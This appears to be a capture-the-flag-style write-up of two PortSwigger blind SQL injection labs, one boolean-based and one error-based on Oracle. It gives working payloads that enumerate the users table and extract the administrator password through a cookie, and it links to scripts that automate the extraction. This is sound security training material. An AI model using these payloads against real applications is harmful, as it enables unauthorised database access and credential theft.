# Blind SQL injection-Boolean Based
## Summary
- [Lab11: Blind SQL injection with conditional responses](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/Blind%20SQL%20injection/Blind%20SQLi%20-%20Boolean%20Based#lab11-blind-sql-injection-with-conditional-responses)
- [Lab12: Blind SQL injection with conditional errors](https://github.com/Sec0gh/Portswigger-Labs/tree/main/SQL%20Injection%20Labs/Blind%20SQL%20injection/Blind%20SQLi%20-%20Boolean%20Based#lab12-blind-sql-injection-with-conditional-errors)

### Lab11: Blind SQL injection with conditional responses
- In Blind SQL injection, the application doesn't reply with the results of the query which we injected so we don't see any messages from the server to help us to detect the error to bypass it. 
- We will depend on some techniques to detect the blind SQL injection and exploit it and one of their techniques is called `using conditional responses`.
- Here, we will send some questions as queries to the server to wait for the reply from it if our query is `True` or `False`.

- You can send any of conditions to validate and monitor the responses like that:
```
TrackingId=xyz'--      
TrackingId=xyz'        (Causing in unnatural behavior)
```
#### or such as that:
```
TrackingId=xyz' AND 1=1--     (True condition)
TrackingId=xyz' AND 1=2--     (False condition and causing in unnatural behavior)
```

> `Note:` Some servers block the comment symbols as `#` and `--`, so we can use the condition with the single quotes like that:

```
TrackingId=xyz' AND '1'='1    (True condition)
TrackingId=xyz' AND '1'='2    (False condition and causing in unnatural behavior)
```
- If we used the comparer in burp suite to observe the behavior of the responses between the `True` and `False` conditions, we will find unnatural behavior in the application and the length of each response is different.
- And there is a `Welcome back!` message that is deleted when we send a `False` condition.
- But in the `True` condition, we will see a `Welcome back!` message in the response.

![lab11_comparer.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab11_comparer.png)

- So we proved and confirmed that the application evaluates our queries and the `TrackingId` parameter is vulnerable to blind SQL injection.

- Now we will try to verify and notice the message in the response to know if our query is `True` or `False`. 
- Here, we sured that there is a table is called a `users` when the `Welcome back!` message has appeared:
```
TrackingId=xyz' AND (SELECT 'test' FROM users LIMIT 1)='test'--
```

> `Note:` In the real-world scenario, you must try a lot of payloads and test a lot to reach any valid query that the application interprets.
- Now we will try to verify if the column of username is existing in the table or not by identifying the username with `administrator`:

```
TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```
- Ok, there is an `administrator` username, so let's go to know the length of the password, but we will need to test many numbers and observe the message when it appears, and so we will know the right number of characters for the password.

```
TrackingId=xyz' AND (select 'test' FROM users WHERE username='administrator' and length(password)=1)='test'--
```
- But we will do that by the brute-forcing the length and matching if the message appeared and then we will know that this is the right number of length:

![lab11_brutefocring_length.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab11_brutefocring_length.png)

- We have known that the length password is 20 char.
- After that, we need to extract the password characters to log in with the admin password.
- We will do that by retrieving that data as numbers, so we will use two important functions to do that:
	- `ASCII`, which returns the [ASCII](https://upload.wikimedia.org/wikipedia/commons/d/dd/ASCII-Table.svg) code for the input character.
	- `SUBSTRING` (or SUBSTR in Oracle), which returns a substring of its input.
- Check out how these functions work:
	- [SUBSTRING()](https://www.w3schools.com/sql/func_mysql_substring.asp)
	- [ASCII()](https://www.w3schools.com/sql/func_mysql_ascii.asp)

```
TrackingId=xyz' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')=112--
```
- But we need to try the ASCII numbers for each char so we will brute-forcing for 20 chars.
- You can do that by using an intruder in the burp suite but it will take a long time to finish.
- We can write a python script to extract the password automatically and quickly.
- You can see my script from here:[SQLi_lab11_password_admin.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab11_password_admin.py)
- To run the script:
```
$ python3 SQLi_lab11_password_admin.py "Target_URl"
```

![lab11_password_admin.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab11_password_admin.png)

- Congrats, we got the password admin.

-----------------------------------------------------------------------
### Lab12: Blind SQL injection with conditional errors
- Here, our methodology will depend on the conditional responses which cause an SQL error.
- The main target is doing anything to cause an error in the database to ensure that the server reads and interprets our query so we will know the parameter is vulnerable to SQL injection.
- We can cause a SQL error like that(You can try any other payloads as you need):

```
TrackingId=xyz'               (Internal Server Error)
TrackingId=xyz' and 1=1'--    (Internal Server Error)
```
- But if you fixed them and added another single quote, you will receive succeeded response.
```
TrackingId=xyz''               (Succeeded response)
TrackingId=xyz' and 1='1'--    (Succeeded response)
```
- If you tried a payload like that you will notice that the logical conditions using (AND, OR) don't respond to any succeeded response.
```
TrackingId=xyz' AND (SELECT NULL)--    (Internal Server Error)
```
- And if you tried the concatenating, it won't work also.
```
TrackingId=xyz' || (SELECT NULL)--    (Internal Server Error)
```
- But if you tried concatenating and used the `dual` table, you will detect that it is an oracle database, and the server will respond with a succeeded response.

```
TrackingId=xyz' ||(SELECT NULL from dual)--
```
- Here we will try to prove that the `user` table is exist but it will respond with an `Internal Server Error`.
```
TrackingId=xyz' ||(SELECT NULL FROM users)--
```
- But you can limit the number of rows in oracle by using `ROWNUM` column.
- Check out: [ROWNUM](https://docs.oracle.com/cd/B14117_01/server.101/b10759/pseudocolumns008.htm)
```
TrackingId=xyz' ||(SELECT NULL FROM users WHERE ROWNUM = 1)--
```
- Now we will use the `CASE` statement to help us to submit our conditions.
- Check out the syntax of it: [SQL CASE Statement](https://www.w3schools.com/sql/sql_case.asp)
- Here, we will set a condition `1=1` which is `True`, so it will execute the action of  `TO_CHAR(1/0)`, and it will cause a `divide-by-zero error` and the server will respond with `Internal Server Error`.
- [TO_CHAR()](https://www.w3schools.blog/to-char-function-oracle): it will make this error because it can not convert this expression `1/0` from number to string, and we will use this function because it is an oracle database.
```
TrackingId=xyz'||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'test' END FROM dual)--
```
- but we can fix this condition by changing it to `1=2` to execute the action of `'test'`.
```
TrackingId=xyz'||(SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'test' END FROM dual)--
```
- You can check out the conditional errors payloads for different databases from the [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
- So now we will check if the administrator is in the `users` table or not by the same previous condition `1=2`.
```
TrackingId=xyz'||(SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'test' END FROM users WHERE username='administrator')--
```
- Now, it is left only to know the password, but first, we need to know the length of the password.
- We will use the condition where if the length of the password is `True`, it will execute the action of `TO_CHAR(1/0)` and the server will respond with the error message.
- But now we will brute force the position of password length with intruder and match the message of `Internal Server Error` when it appears.
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)=1 THEN TO_CHAR(1/0) ELSE 'test' END FROM users WHERE username='administrator')--
```
- It's very amazing, we caught the length of the password through the error message, which appeared in the response(The password length is 20 char).

![lab12_length_password.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab12_length_password.png)

- After we have known the length of the password, we need to extract the password characters to log in with the admin password.
- We will do that by retrieving that data as numbers, so we will use two important functions to do that:
	- `ASCII`, which returns the [ASCII](https://upload.wikimedia.org/wikipedia/commons/d/dd/ASCII-Table.svg) code for the input character.
	- `SUBSTRING` (or `SUBSTR` in Oracle), which returns a substring of its input.

```
TrackingId=xyz'||(SELECT CASE WHEN ASCII(SUBSTR(password,1,1))=111 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- But we need to try the ASCII numbers for each char so we will brute-forcing for 20 chars.
- You can do that by using an intruder in the burp suite but it will take a long time to finish.
- We can write a python script to extract the password automatically and quickly.
- You can see my script from here:[SQLi_lab12_password_admin.py](https://github.com/Sec0gh/python-scripts/blob/main/Blind%20SQLi%20scripts/SQLi_lab12_password_admin.py)
- To run the script:
```
$ python3 SQLi_lab12_password_admin.py "Target_URl"
```

![lab12_admin_password.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab12_admin_password.png)

- Congrats, and finally, we got the password admin.









